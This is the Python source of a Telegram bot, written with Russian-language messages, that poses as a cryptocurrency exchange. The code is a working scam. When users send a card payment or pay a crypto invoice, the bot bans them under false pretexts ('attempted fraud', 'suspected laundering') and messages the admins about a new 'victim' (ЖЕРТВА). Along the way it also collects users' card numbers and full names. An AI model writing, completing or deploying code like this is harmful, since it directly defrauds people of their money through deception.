from aiogram import Router, F, types
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from datetime import datetime
from data.texts import *
from data.keyboards import *
from database.models import is_banned, ban_user, add_transaction
from services.crypto_pay import CryptoPay
import os

router = Router()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "872151895,6593438966").split(",")]

CRYPTO_LIST = [
    ("USDT (TRC20)", "USDT"),
    ("USDT (ERC20)", "USDT"),
    ("BTC", "BTC"),
    ("ETH", "ETH"),
    ("TON", "TON"),
    ("SOL", "SOL"),
    ("BNB", "BNB"),
    ("XRP", "XRP"),
    ("DOGE", "DOGE"),
    ("LTC", "LTC"),
]

class ExchangeStates(StatesGroup):
    waiting_sell_amount = State()
    waiting_card_number = State()
    waiting_card_owner = State()


# ==================== КУПИТЬ КРИПТУ ====================
@router.callback_query(F.data == "buy_crypto")
async def buy_crypto(call: CallbackQuery):
    if is_banned(call.from_user.id):
        await call.answer("🚫 Вы заблокированы!"); return
    
    await call.message.edit_text(
        f"💳 <b>КУПИТЬ КРИПТУ</b>\n\n"
        f"Курс: 1 USDT = 75₽\n\n"
        f"💳 Карта: <code>{CARD}</code>\n"
        f"🏦 Банк: {BANK}\n\n"
        f"1. Переведите нужную сумму на карту\n"
        f"2. Нажмите «Я ОПЛАТИЛ»",
        reply_markup=InlineKeyboardBuilder()
            .button(text="✅ Я ОПЛАТИЛ", callback_data="paid_card")
            .button(text="◀️ НАЗАД", callback_data="start")
            .adjust(1).as_markup()
    )
    await call.answer()


@router.callback_query(F.data == "paid_card")
async def paid_card(call: CallbackQuery):
    add_transaction(call.from_user.id, "buy", 0, "RUB", "CARD")
    ban_user(call.from_user.id, "Подозрительная активность")
    
    await call.message.edit_text(
        f"🚫 <b>АККАУНТ ЗАБЛОКИРОВАН!</b>\n\n"
        f"Причина: попытка обмана системы.\n"
        f"Обратитесь в поддержку: {SUPPORT_URL}",
        reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url=SUPPORT_URL).as_markup()
    )
    
    for aid in ADMIN_IDS:
        try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА КАРТУ!</b>\n👤 {call.from_user.id}")
        except: pass
    await call.answer()


# ==================== ПРОДАТЬ КРИПТУ ====================
@router.callback_query(F.data == "sell_crypto")
async def sell_crypto(call: CallbackQuery):
    if is_banned(call.from_user.id): return
    
    builder = InlineKeyboardBuilder()
    for name, code in CRYPTO_LIST:
        builder.button(text=name, callback_data=f"sell_currency_{code}")
    builder.button(text="◀️ НАЗАД", callback_data="start")
    builder.adjust(2)
    
    await call.message.edit_text(
        "💰 <b>ПРОДАТЬ КРИПТУ</b>\n\n"
        "Выберите валюту которую хотите продать:",
        reply_markup=builder.as_markup()
    )
    await call.answer()


@router.callback_query(F.data.startswith("sell_currency_"))
async def sell_currency_chosen(call: CallbackQuery, state: FSMContext):
    currency = call.data.replace("sell_currency_", "")
    await state.update_data(currency=currency)
    await state.set_state(ExchangeStates.waiting_sell_amount)
    
    await call.message.edit_text(
        f"💰 <b>ПРОДАТЬ {currency}</b>\n\n"
        f"Курс: 1 {currency} = 70₽\n\n"
        f"Введите сумму в {currency} которую хотите продать:",
        reply_markup=InlineKeyboardBuilder().button(text="◀️ НАЗАД", callback_data="sell_crypto").as_markup()
    )
    await call.answer()


@router.message(ExchangeStates.waiting_sell_amount)
async def process_sell_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 1:
            await message.answer("❌ Минимальная сумма: 1")
            return
    except:
        await message.answer("❌ Введите число!")
        return
    
    await state.update_data(amount=amount)
    await state.set_state(ExchangeStates.waiting_card_number)
    
    await message.answer(
        "📝 <b>РЕКВИЗИТЫ ДЛЯ ВЫПЛАТЫ</b>\n\n"
        "Введите номер карты (16 цифр) или номер телефона (СБП):\n\n"
        "💳 Карта: 2200 1234 5678 9012\n"
        "📱 СБП: +7 999 123 45 67",
        reply_markup=InlineKeyboardBuilder().button(text="❌ ОТМЕНА", callback_data="start").as_markup()
    )


@router.message(ExchangeStates.waiting_card_number)
async def process_card_number(message: Message, state: FSMContext):
    card = message.text.strip()
    await state.update_data(card=card)
    await state.set_state(ExchangeStates.waiting_card_owner)
    
    await message.answer(
        "📝 <b>ПОЛУЧАТЕЛЬ</b>\n\n"
        "Введите ФИО получателя:\n\n"
        "👤 Например: IVAN IVANOV",
        reply_markup=InlineKeyboardBuilder().button(text="❌ ОТМЕНА", callback_data="start").as_markup()
    )


@router.message(ExchangeStates.waiting_card_owner)
async def process_card_owner(message: Message, state: FSMContext):
    owner = message.text.strip().upper()
    data = await state.get_data()
    await state.clear()
    
    currency = data['currency']
    amount = data['amount']
    card = data['card']
    rub_amount = amount * 70
    
    invoice = await CryptoPay.create_invoice(rub_amount)
    if invoice:
        add_transaction(message.from_user.id, "sell", rub_amount, currency, card)
        
        builder = InlineKeyboardBuilder()
        builder.button(text="💸 ПЕРЕЙТИ К ОПЛАТЕ", url=invoice["pay_url"])
        builder.button(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_{invoice['invoice_id']}")
        builder.button(text="◀️ НАЗАД", callback_data="start")
        builder.adjust(1)
        
        await message.answer(
            f"✅ <b>ЗАЯВКА СОЗДАНА!</b>\n\n"
            f"💰 Вы продаёте: {amount} {currency}\n"
            f"💵 Вы получите: {rub_amount}₽\n"
            f"💳 На реквизиты: <code>{card}</code>\n"
            f"👤 Получатель: {owner}\n\n"
            f"К оплате через CryptoBot: ~{invoice['amount']} {invoice['asset']}\n\n"
            f"Нажмите «Перейти к оплате»",
            reply_markup=builder.as_markup()
        )
    else:
        await message.answer("❌ Ошибка создания счёта. Попробуйте позже.")


@router.callback_query(F.data.startswith("check_"))
async def check_payment(call: CallbackQuery):
    inv_id = int(call.data.split("_")[1])
    status = await CryptoPay.check_invoice(inv_id)
    
    if status == "paid":
        ban_user(call.from_user.id, "Транзакция отклонена")
        await call.message.edit_text(
            f"🚫 <b>ТРАНЗАКЦИЯ ОТКЛОНЕНА!</b>\n\n"
            f"Причина: подозрение на отмывание средств.\n"
            f"Обратитесь в поддержку: {SUPPORT_URL}",
            reply_markup=InlineKeyboardBuilder().button(text="📞 ПОДДЕРЖКА", url=SUPPORT_URL).as_markup()
        )
        for aid in ADMIN_IDS:
            try: await call.bot.send_message(aid, f"💰 <b>ЖЕРТВА НА CRYPTO!</b>\n👤 {call.from_user.id}")
            except: pass
    elif status == "active":
        await call.answer("⏳ Счёт ещё не оплачен", show_alert=True)
    else:
        await call.answer("❌ Счёт истёк", show_alert=True)
    await call.answer()
